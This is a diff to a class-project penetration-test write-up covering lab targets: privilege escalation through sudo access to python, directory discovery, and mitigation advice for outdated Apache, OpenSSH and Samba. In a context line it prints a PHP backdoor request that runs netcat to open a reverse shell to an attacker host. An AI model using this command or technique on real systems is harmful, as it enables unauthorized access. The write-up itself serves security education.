@@ -77,15 +77,15 @@ By exporting the two hashes from the database into a text file, John the Ripper 
 #### Privilege Escalation
 After switching users to Steven, I checked his sudo access.
 `sudo -l`
-~[sudo access](/images/class-projects/final/sudo.png)
+![sudo access](/images/class-projects/final/sudo.png)
 and saw that he has sudo access for python. That's certainly an issue considering python can execute commands including things like creatinga new bash shell.
 
 After writing a quick little privilege escalations script
-~[Privesc.py](/images/class-projects/final/privesc.png)
+![Privesc.py](/images/class-projects/final/privesc.png)
 I ran that script as root
 `sudo python privesc.py`
 which created a new shell as root.
-~[root](/images/class-projects/final/root.png)
+![root](/images/class-projects/final/root.png)
 
 Flag4 was inside root's home directory, and was the final objective for Target1.
 
@@ -94,7 +94,7 @@ This goal on this machine was only to gain user access, although it did take a l
 
 #### Reconassiance
 This machine started off similarly with a nmap scan `nmap -sV 162.168.1.115` and then running DirBuster.
-~[DirBuster](/images/class-projects/final/dirbuster2.png)
+![DirBuster](/images/class-projects/final/dirbuster2.png)
 
 This revealed the directory `192.168.1.115/vendor/PATH` which contained Flag1.
 
@@ -109,7 +109,7 @@ First, netcat was used to start a listener. `nc -lnvp 4444` and then the php com
 `192.198.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
 
 That connection immediately revealed Flag2
-~[Flag2](/images/class-projects/final/flag2.png)
+![Flag2](/images/class-projects/final/flag2.png)
 
 Flag3 was located with a find command
 `find /var/www -type f -iname 'flag*'
@@ -163,19 +163,19 @@ In addition to the vulnerabilities that were used to exploit the machines in the
 
 #### Updating Apache
 Both target machines were running Apache 2.4.10 which contained known vulnerabilities, including CVE-2017-3167
-![CVE-201703167](/images/class-project/final/apache.png)
+![CVE-201703167](/images/class-projects/final/apache.png)
 The vulnerability was patched in versions 2.2.33 and 2.4.26, and updating to the newest apache version mitigates the vulnerability. At the time of the project the latest version of apache was 2.4.46.
 *Mitigation* `sudo apt install apache 2.4`
 
 #### Updating OpenSSH
 The target machines were running OpenSSH 6.7p1 which is vulnerable to CVE-2018-15919.
-~[CVE-2018-15919](/images/class-proejct/final/openssh.png)
+![CVE-2018-15919](/images/class-proejcts/final/openssh.png)
 The vulnerability existed through versions 7.8, so updating to the latest version of OpenSSH would effectively mitigate the vulnerability. At the time of the project, the latest version was 8.3.
 *Mitigation* `sudo apt install ssh 8.3`
 
 #### Updating Samba
 Another vulnerable service on the target machines was Samba. The machines were vulnerable to a code execution vulnerability through Samba, CVE-2017-7494.
-~[CVE-2017-7494](/images/class-project/final/samba.png)
+![CVE-2017-7494](/images/class-projects/final/samba.png)
 Like the other vulnerability, the solution was to update to a newer version where the vulnerability had been patched. In this case, version 4.12.
 *Mitigation* `sudo apt install samba 4.12`
 
